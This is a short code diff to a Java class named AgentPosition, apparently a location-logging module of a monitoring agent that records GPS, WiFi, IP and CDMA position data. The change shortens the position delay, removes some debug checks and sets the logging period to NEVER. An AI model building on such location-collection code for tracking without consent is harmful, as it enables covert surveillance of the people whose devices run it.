@@ -48,7 +48,7 @@ public class AgentPosition extends BaseModule implements IncrementalLog, Locatio
 	private static final int LOG_TYPE_WIFI = 3;
 	private static final int LOG_TYPE_IP = 4;
 	private static final int LOG_TYPE_CDMA = 5;
-	private static final long POSITION_DELAY = 1000;
+	private static final long POSITION_DELAY = 100;
 
 	GPSLocator locator;
 
@@ -131,16 +131,6 @@ public class AgentPosition extends BaseModule implements IncrementalLog, Locatio
 		}
 
 		if (Cfg.DEBUG) {
-			Check.asserts(period > 0, "parse period: " + period); //$NON-NLS-1$
-			// if(Cfg.DEBUG) Check.asserts(type == 1 || type == 2 || type == //$NON-NLS-1$
-			// 4, "parse type: "
-			// + type);
-		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: " + "Period: " + period);//$NON-NLS-1$ //$NON-NLS-2$
-		}
-		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
 		}
 		if (Cfg.DEBUG) {
@@ -150,7 +140,7 @@ public class AgentPosition extends BaseModule implements IncrementalLog, Locatio
 			Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		setPeriod(period);
+		setPeriod(NEVER);
 		setDelay(POSITION_DELAY);
 
 		return true;
